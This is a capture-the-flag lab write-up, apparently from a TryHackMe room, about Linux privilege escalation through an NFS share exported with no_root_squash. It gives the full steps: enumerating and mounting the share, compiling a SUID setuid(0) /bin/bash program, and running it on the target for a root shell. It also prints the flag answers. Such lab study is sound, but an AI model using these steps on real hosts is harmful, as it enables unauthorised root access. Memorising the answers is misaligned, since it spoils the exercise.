## Privilege Escalation: NFS (Network File Sharing) Solution

### Notes:
- SSH and Telnet can be used for root access.
  - Can find SSH private key in target system to connect with root privilege

- Misconfigured network shell.
  - can be present when network backup exist.

- NFS configuration in `/etc/exports/`
  - Look for **no_root_squash** on writable share as will allow creation of executable with SUID bit set and execute on target system. 
    - By default NFS will remove root privileges from any file by changing root user to nfsnobody. 

### How many mountable shares can you identify on the target system?
1. Run the following command in attacke machine:
   ```
   showmount -e {target_machine ip} 
   ```
![Screenshot 2024-02-10 at 12 26 51 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/c11922f6-362c-4133-8fb0-64888fc248bf)

**Answer: 3**

### How many shares have the "no_root_squash" option enabled?
1. Run `cat /etc/exports` on the target machine
![Screenshot 2024-02-10 at 12 29 08 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/86da6e1c-0302-4218-a90d-eff384554769)


**Answer: 3** 

### What is the content of the flag7.txt file?
1. Let's mount one of the mountable shares by executing the following on attack machine:
```
mkdir /tmp/backupsharemounted
mount -o rw 10.10.139.175:/home/ubuntu/sharedfolder /tmp/backupsharemounted
cd /tmp/backupsharemounted
touch attack.c
```

2. Let's update `attack.c` to execute `bin/bash` on the attack machine. 
```
int main()
{setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
```

3. Execute the following on the attack machine
```
gcc attack.c -o attack -w
chmod +s attack
```

4. On target machine `cd /home/ubuntu/sharedfolder` and you will see the attack executable file.

![Screenshot 2024-02-10 at 1 10 50 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/70e06ea0-6ed2-426a-9e0d-91f3986be554)

5. Execute `./attack` on the target machine and this will provide us with bash root privileges.
   
![Screenshot 2024-02-10 at 1 13 43 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/89fedd61-2ef1-4060-8afc-8f71692b5904)

6. Run `cat /home/matt/flag7.txt` on the target machine
   
![Screenshot 2024-02-10 at 1 16 01 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/23d9f3c8-29af-4a81-81aa-c25357956866)

**Answer:THM-89384012**

